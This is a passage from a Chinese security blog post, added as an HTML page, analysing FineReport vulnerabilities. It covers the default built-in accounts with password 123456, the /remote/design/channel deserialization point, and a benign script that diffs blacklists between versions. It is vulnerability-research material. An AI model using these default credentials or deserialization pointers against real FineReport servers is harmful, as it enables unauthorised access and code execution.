@@ -1,0 +1,1029 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            帆软报表FineReport历史漏洞分析（二） |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        帆软报表FineReport历史漏洞分析（二）
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv5</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-03-20 20:34:26</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Tue Mar 24 2026 11:14:26 GMT+0800">2026-03-24 11:14:26</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>5.5k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>26 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>本文首发于先知社区：<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/91802" >https://xz.aliyun.com/news/91802<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在上一篇文章（<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/91753%EF%BC%89%E4%B8%AD%EF%BC%8C%E5%AF%B9%E5%B8%86%E8%BD%AFFineReport%E7%9A%84%E8%B7%AF%E7%94%B1%E7%BB%93%E6%9E%84%E5%92%8CSQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E4%BA%86%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E3%80%82" >https://xz.aliyun.com/news/91753）中，对帆软FineReport的路由结构和SQL注入类漏洞进行了详细分析。<i class="fas fa-external-link-alt"></i></a></p>
+<p>这篇文章主要对之前遗留的channel接口反序列化漏洞和FineVis文件上传漏洞进行分析，最后列举一下V8 V9老版本的一些漏洞。</p>
+<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773732213949-94d8762e-2b95-4084-ad83-ea5d8e8c1528.png"  alt="img"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>实际的内置用户，以管理员登录后的页面为准：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773732679298-330747e2-230a-4810-a0ad-3ef325aa9f8a.png"  alt="img"></p>
+<p>任意挑选一个用户，密码都为123456，即可登录后台。</p>
+<h2 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h2><p>删除默认的内置用户，或手动修改密码。</p>
+<h1 id="remote-design-channel反序列化"><a href="#remote-design-channel反序列化" class="headerlink" title="&#x2F;remote&#x2F;design&#x2F;channel反序列化"></a>&#x2F;remote&#x2F;design&#x2F;channel反序列化</h1><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>V11只能后台利用，&lt;&#x3D;11.0.32 有利用链</p>
+<p>V10能前台利用，全版本都有利用链</p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="反序列化点"><a href="#反序列化点" class="headerlink" title="反序列化点"></a>反序列化点</h3><p>官方通告中给出了路由：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773711456312-1a2317dd-ef64-4746-989f-f1bf9fe43d64.png"  alt="img"></p>
+<p>搜索路由，找到对应类：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773711467893-d2663b36-2070-4d13-b1da-e2e8819ab19a.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773711477939-0e036bee-9909-4af1-a0ef-44da16cd16a3.png"  alt="img"></p>
+<p>跟进onMessage，这里V11和V10版本有明显不同。</p>
+<p>V10版本没有任何校验，直接对数据进行处理，能够前台利用：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773712063264-a84a3a17-0101-40c3-a0c1-dd73f9df287f.png"  alt="img"></p>
+<p>而V11版本是有身份校验的，只能后台利用：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773711513813-8229e2ed-80be-4296-b547-4e88bc358dcf.png"  alt="img"></p>
+<p>两者的序列化数据都直接作为请求体。</p>
+<p>实际上，官方通报中的这几个漏洞，在V11都只能后台利用：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773712140899-2f5eb760-f258-44f9-8724-139a578a54ca.png"  alt="img"></p>
+<p>这里先不分析鉴权，继续分析反序列化点，跟进最后一行的com.fr.workspace.WorkContext#handleMessage：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773712235778-a9e443df-e67e-4248-b9bb-bb627208ba1e.png"  alt="img"></p>
+<p>继续跟进handleMessage：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773712267101-105a54a0-ea33-401f-add1-b47ab5076988.png"  alt="img"><br><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773712276600-cc97a517-e8fb-45bf-a7fc-62fa0edcd0d5.png"  alt="img"></p>
+<p>这里就是反序列化点了，能够看出，使用的是SafeInvocationSerializer，且经过一层Gzip包裹。</p>
+<h3 id="反序列化链"><a href="#反序列化链" class="headerlink" title="反序列化链"></a>反序列化链</h3><p>这个漏洞本质上就是找反序列化链，而涉及到的反序列化链有很多文章都分析过，所以这里仅简单分析一下。</p>
+<p>由于没法找到每个版本的黑名单，所以不清楚链子具体是在哪个版本被禁用的，部分链子仅能给出大致的修复版本。</p>
+<p>另外，帆软中的第三方包都位于com&#x2F;fr&#x2F;third中，包名和正常的不一样，所以利用链都不能直接用工具生成，需要自己手写。</p>
+<p>还有一件事，官方说的HSQL漏洞命令执行漏洞，实际就是这个接口的反序列化漏洞，只是最新的绕过用到了HSQL去调public static方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773802683492-d18b3a41-6efa-452b-bda2-6e47efd095e0.png"  alt="img"></p>
+<p>这里的拥有远程设计权限和封禁路由，都和channel反序列化对应。</p>
+<h4 id="黑名单对比"><a href="#黑名单对比" class="headerlink" title="黑名单对比"></a>黑名单对比</h4><p>通过黑名单对比，能够知道每个版本新增的过滤类，从而反推链子。</p>
+<p>黑名单位于：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773800968968-b434b2f5-3cc8-4a69-8563-8e0dde586a79.png"  alt="img"></p>
+<p>对比脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">比较两个txt文件的行差异</span></span><br><span class="line"><span class="string">找出增加的行和减少的行</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare_files</span>(<span class="params">file1: <span class="built_in">str</span>, file2: <span class="built_in">str</span></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">set</span>, <span class="built_in">set</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    比较两个文件的行差异</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        file1: 原始文件路径（基准文件）</span></span><br><span class="line"><span class="string">        file2: 新文件路径</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        tuple: (增加的行集合, 减少的行集合)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 读取文件内容，去除每行首尾空白</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file1, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines1 = &#123;line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file2, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines2 = &#123;line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算差异</span></span><br><span class="line">    added = lines2 - lines1    <span class="comment"># 在新文件中增加的行</span></span><br><span class="line">    removed = lines1 - lines2  <span class="comment"># 在新文件中减少的行</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> added, removed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_line</span>(<span class="params">line: <span class="built_in">str</span>, keyword: <span class="built_in">str</span> | <span class="literal">None</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    格式化输出行，如果包含关键词则用*标注</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        line: 要输出的行内容</span></span><br><span class="line"><span class="string">        keyword: 关键词（可选）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        格式化后的行</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> keyword <span class="keyword">and</span> keyword <span class="keyword">in</span> line:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;  * <span class="subst">&#123;line&#125;</span>  &lt;--&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;    <span class="subst">&#123;line&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&#x27;比较两个txt文件的行差异&#x27;</span>,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">        epilog=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">示例:</span></span><br><span class="line"><span class="string">  python compare_txt.py old.txt new.txt</span></span><br><span class="line"><span class="string">  python compare_txt.py old.txt new.txt &quot;Servlet&quot;</span></span><br><span class="line"><span class="string">  python compare_txt.py old.txt new.txt &quot;Servlet&quot; --output result.txt</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file1&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;原始文件路径（基准文件）&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file2&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;新文件路径&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;keyword&#x27;</span>, nargs=<span class="string">&#x27;?&#x27;</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&#x27;关键词，匹配的行会用*标注（可选）&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output&#x27;</span>, <span class="string">&#x27;-o&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;输出结果到指定文件（可选）&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--sort&#x27;</span>, <span class="string">&#x27;-s&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;按字母顺序排序输出&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> Path(args.file1).exists():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 文件 &#x27;<span class="subst">&#123;args.file1&#125;</span>&#x27; 不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> Path(args.file2).exists():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 文件 &#x27;<span class="subst">&#123;args.file2&#125;</span>&#x27; 不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 比较文件</span></span><br><span class="line">    added, removed = compare_files(args.file1, args.file2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建输出内容</span></span><br><span class="line">    output_lines = []</span><br><span class="line">    output_lines.append(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    output_lines.append(<span class="string">f&quot;基准文件: <span class="subst">&#123;args.file1&#125;</span>&quot;</span>)</span><br><span class="line">    output_lines.append(<span class="string">f&quot;比较文件: <span class="subst">&#123;args.file2&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> args.keyword:</span><br><span class="line">        output_lines.append(<span class="string">f&quot;关键词: <span class="subst">&#123;args.keyword&#125;</span>&quot;</span>)</span><br><span class="line">    output_lines.append(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出减少的行</span></span><br><span class="line">    output_lines.append(<span class="string">f&quot;\n【减少的行】(<span class="subst">&#123;<span class="built_in">len</span>(removed)&#125;</span> 个)&quot;</span>)</span><br><span class="line">    output_lines.append(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">if</span> removed:</span><br><span class="line">        sorted_removed = <span class="built_in">sorted</span>(removed) <span class="keyword">if</span> args.sort <span class="keyword">else</span> removed</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> sorted_removed:</span><br><span class="line">            output_lines.append(format_line(line, args.keyword))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output_lines.append(<span class="string">&quot;  (无)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出增加的行</span></span><br><span class="line">    output_lines.append(<span class="string">f&quot;\n【增加的行】(<span class="subst">&#123;<span class="built_in">len</span>(added)&#125;</span> 个)&quot;</span>)</span><br><span class="line">    output_lines.append(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">if</span> added:</span><br><span class="line">        sorted_added = <span class="built_in">sorted</span>(added) <span class="keyword">if</span> args.sort <span class="keyword">else</span> added</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> sorted_added:</span><br><span class="line">            output_lines.append(format_line(line, args.keyword))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output_lines.append(<span class="string">&quot;  (无)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 统计信息</span></span><br><span class="line">    <span class="comment"># 读取文件获取行数</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(args.file1, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        count1 = <span class="built_in">len</span>([l <span class="keyword">for</span> l <span class="keyword">in</span> f <span class="keyword">if</span> l.strip()])</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(args.file2, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        count2 = <span class="built_in">len</span>([l <span class="keyword">for</span> l <span class="keyword">in</span> f <span class="keyword">if</span> l.strip()])</span><br><span class="line"></span><br><span class="line">    output_lines.append(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    output_lines.append(<span class="string">&quot;统计信息:&quot;</span>)</span><br><span class="line">    output_lines.append(<span class="string">f&quot;  基准文件行数: <span class="subst">&#123;count1&#125;</span>&quot;</span>)</span><br><span class="line">    output_lines.append(<span class="string">f&quot;  比较文件行数: <span class="subst">&#123;count2&#125;</span>&quot;</span>)</span><br><span class="line">    output_lines.append(<span class="string">f&quot;  减少行数: <span class="subst">&#123;<span class="built_in">len</span>(removed)&#125;</span>&quot;</span>)</span><br><span class="line">    output_lines.append(<span class="string">f&quot;  增加行数: <span class="subst">&#123;<span class="built_in">len</span>(added)&#125;</span>&quot;</span>)</span><br><span class="line">    output_lines.append(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    result = <span class="string">&#x27;\n&#x27;</span>.join(output_lines)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存到文件</span></span><br><span class="line">    <span class="keyword">if</span> args.output:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(result)</span><br><span class="line">        <span 